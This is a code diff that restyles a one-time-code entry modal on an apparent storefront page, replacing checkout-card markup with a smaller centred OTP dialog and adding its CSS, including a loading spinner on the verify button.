@@ -111,10 +111,20 @@
     .auth-register { width:100%; border:1px solid #202b36; background:#fff; padding:12px; color:#202b36; font-weight:750; }
     .auth-terms { margin:24px auto 0; color:#89919a; font-size:11px; line-height:1.35; text-align:center; }
     @media (max-width:560px) { .auth-dialog { padding:40px 25px 24px; } }
-    .checkout-icon-field { position:relative; }
-    .checkout-input-with-icon { padding-left:42px; }
-    .checkout-input-icon { position:absolute; left:13px; top:50%; z-index:1; width:17px; height:17px; transform:translateY(-50%); color:#9aa4b2; pointer-events:none; }
-    .checkout-icon-field:focus-within .checkout-input-icon { color:#ff6a00; }
+    /* OTP Modal - Smaller Auth Style */
+    .otp-layer { position:fixed; inset:0; z-index:10; display:none; overflow:auto; background:rgba(0,0,0,0.4); }
+    .otp-layer.open { display:block; }
+    .otp-dialog { position:relative; width:min(400px, 90%); background:#fff; padding:32px 28px 22px; box-shadow:0 20px 50px #0002; margin:auto; text-align:center; }
+    .otp-close { position:absolute; top:12px; right:14px; border:0; background:transparent; color:#666; font-size:26px; line-height:1; cursor:pointer; }
+    .otp-dialog h2 { margin:0 0 10px; font-size:20px; font-weight:700; color:#222; }
+    .otp-icon { font-size:28px; margin-bottom:8px; }
+    .otp-input { width:100%; padding:12px 14px; border:1px solid #ddd; border-radius:6px; font:700 18px/1.3 ui-monospace,monospace; letter-spacing:.35em; text-align:center; }
+    .otp-input:focus { outline:2px solid #ff6a0028; border-color:#ff6a00; background:#fff; }
+    .otp-help { margin:12px 0 0; font-size:13px; color:#666; }
+    .otp-help a { color:#ff6a00; text-decoration:none; }
+    .otp-btn { width:100%; margin-top:16px; padding:12px; border:0; background:#ff6a00; color:#fff; font:700 16px/1.2; border-radius:6px; cursor:pointer; transition:opacity .15s; position:relative; overflow:hidden; }
+    .otp-btn:disabled { opacity:0.65; cursor:not-allowed; }
+    .otp-btn.loading::after { content:''; position:absolute; left:50%; top:50%; width:18px; height:18px; margin:-9px 0 0 -9px; border:2px solid transparent; border-top-color:#fff; border-radius:50%; animation:spin 0.8s linear infinite; }
     @media (max-width:720px) { .checkout-grid { grid-template-columns:1fr; } .checkout-fields { grid-template-columns:1fr; } .checkout-wrap { width:min(100% - 24px,600px); margin-top:18px; } .checkout-card { padding:18px; } }
 
 /* Signin/Register Modal - AliExpress Style */
@@ -562,19 +572,14 @@
   </div>
   
 <!-- OTP Modal -->
-   <div class="checkout-layer" id="otp-modal" aria-hidden="true">
-     <div class="checkout-wrap">
-       <div class="checkout-top">
-         <h2>Enter OTP Code</h2>
-         <button class="checkout-close" id="close-otp">×</button>
-       </div>
-       <div class="checkout-card">
-         <div class="otp-icon">🔐</div>
-         <h3>Enter the 6-digit code</h3>
-         <input type="text" id="otp-code" class="checkout-input" maxlength="6" placeholder="123456">
-         <p class="otp-help">Didn't receive it? <a href="#" id="resend-otp">Resend code</a></p>
-         <button class="checkout-submit" id="verify-otp" style="margin-top:0">Verify Code</button>
-       </div>
+   <div class="otp-layer" id="otp-modal" aria-hidden="true">
+     <div class="otp-dialog">
+       <button class="otp-close" id="close-otp">×</button>
+       <div class="otp-icon">🔐</div>
+       <h2>Enter OTP Code</h2>
+       <input type="text" id="otp-code" class="otp-input" maxlength="6" placeholder="123456">
+       <p class="otp-help">Didn't receive it? <a href="#" id="resend-otp">Resend code</a></p>
+       <button class="otp-btn" id="verify-otp">Verify Code</button>
      </div>
    </div>
   
